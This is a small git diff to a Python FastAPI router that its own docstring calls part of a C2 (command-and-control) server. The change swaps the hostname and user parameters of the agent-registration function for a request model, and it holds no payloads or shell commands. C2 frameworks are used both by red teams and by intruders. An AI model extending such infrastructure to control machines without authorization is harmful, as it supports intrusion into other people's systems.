@@ -9,7 +9,7 @@ from pathlib import Path
 from fastapi import APIRouter, Request, HTTPException, UploadFile, File
 
 from core.agent import Agent
-from models import Commands, CommandResult
+from models import Commands, CommandResult, AgentIntial
 from config import agents, UPLOAD_DIR, MAX_FILE_SIZE
 
 
@@ -17,7 +17,7 @@ router = APIRouter(prefix="/agent", tags=["agent-communication"])
 
 
 # Note: /join route is registered in main.py without prefix
-def create_agent(hostname: str, user: str, request: Request):
+def create_agent(agentintial: AgentIntial, request: Request):
     """Register a new agent with the C2 server"""
     # Generate a random agent ID that doesn't already exist
     attempts = 0
@@ -31,7 +31,7 @@ def create_agent(hostname: str, user: str, request: Request):
     if agent_id in agents:
         raise HTTPException(status_code=500, detail="Failed to generate unique agent ID")
 
-    ag = Agent(agent_id, request.client.host, hostname, user)
+    ag = Agent(agent_id, request.client.host, agentintial.hostname, agentintial.user)
     agents[agent_id] = ag
 
     return {'id': agent_id, "status": True}
